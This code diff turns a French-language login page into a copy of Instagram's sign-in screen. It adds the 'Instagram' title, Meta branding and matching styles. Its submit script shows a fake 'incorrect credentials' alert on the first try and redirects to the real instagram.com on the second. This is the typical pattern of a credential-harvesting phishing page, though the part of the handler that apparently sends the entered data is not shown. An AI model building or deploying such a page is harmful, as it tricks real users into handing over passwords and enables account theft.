@@ -4,85 +4,121 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Se connecter</title>
+  <title>Instagram</title>
   <style>
     body {
-      font-family: sans-serif;
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
       background-color: #fff;
-      text-align: center;
-      padding: 50px 20px;
+      color: #262626;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
     .container {
+      width: 100%;
       max-width: 400px;
-      margin: auto;
+      padding: 20px;
+    }
+
+    .language {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #8e8e8e;
     }
 
     .logo {
-      width: 100px;
-      height: 100px;
-      margin: 40px auto;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 30px;
       background-color: #eee;
       border-radius: 20px;
     }
 
     input {
-      display: block;
       width: 100%;
-      margin-bottom: 15px;
-      padding: 10px;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-      font-size: 16px;
+      padding: 12px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 6px;
+      font-size: 14px;
     }
 
-    .btn-primary {
+    button {
+      width: 100%;
       background-color: #0095f6;
       color: white;
-      padding: 12px;
       border: none;
-      border-radius: 25px;
-      font-size: 16px;
+      padding: 10px;
+      border-radius: 8px;
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .forgot {
+      text-align: center;
+      margin: 15px 0;
+      font-size: 13px;
+      color: #00376b;
+    }
+
+    .create-account {
+      border: 1px solid #dbdbdb;
+      border-radius: 30px;
+      padding: 12px;
+      text-align: center;
+      margin-top: 20px;
+      font-weight: bold;
+      color: #0095f6;
       cursor: pointer;
     }
 
-    .btn-secondary {
-      background-color: transparent;
-      border: 1px solid #0095f6;
-      color: #0095f6;
-      padding: 12px;
-      border-radius: 25px;
+    .meta {
+      text-align: center;
       margin-top: 20px;
-      font-size: 16px;
-    }
-
-    .meta-logo {
-      margin-top: 30px;
-      font-size: 14px;
-      color: gray;
+      font-size: 12px;
+      color: #8e8e8e;
     }
   </style>
 </head>
 
 <body>
   <div class="container">
+    <div class="language" id="lang-label">Français (France)</div>
     <div class="logo" id="logo-placeholder"></div>
     <form id="login-form">
       <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
       <input type="password" id="password" placeholder="Mot de passe" required>
-      <button type="submit" class="btn-primary">Se connecter</button>
+      <button type="submit">Se connecter</button>
     </form>
-    <p id="message" style="margin-top: 20px;"></p>
-    <p><a href="#">Mot de passe oublié ?</a></p>
-    <button class="btn-secondary">Créer un compte</button>
-    <div class="meta-logo">© Meta
+    <div class="forgot">Mot de passe oublié ?</div>
+    <div class="create-account">Créer un compte</div>
+    <div class="meta">© Meta
     </div>
   </div>
 
   <script>
-    const form = document.getElementById("login-form");
-    const message = document.getElementById("message");
+    // اللغة حسب لغة المتصفح
+    const langElement = document.getElementById("lang-label");
+    const lang = navigator.language || navigator.userLanguage;
 
+    const langMap = {
+      'fr': 'Français (France)',
+      'en': 'English (US)',
+      'de': 'Deutsch',
+      'ar': 'العربية',
+      'it': 'Italiano',
+    };
+
+    const langShort = lang.split("-")[0];
+    if (langMap[langShort]) {
+      langElement.textContent = langMap[langShort];
+    }
+
+    const form = document.getElementById("login-form");
     let attempt = 0;
 
     form.addEventListener("submit", async function (e) {
@@ -111,12 +147,16 @@
         });
       }
 
-      message.textContent = "Chargement...";
+      const btn = form.querySelector('button');
+      btn.disabled = true;
+      btn.textContent = 'Chargement...';
 
       setTimeout(() => {
         attempt++;
+        btn.disabled = false;
         if (attempt < 2) {
-          message.textContent = "Informations incorrectes. Veuillez réessayer.";
+          btn.textContent = 'Se connecter';
+          alert("Informations incorrectes. Veuillez réessayer.");
         } else {
           window.location.href = "https://www.instagram.com";
         }
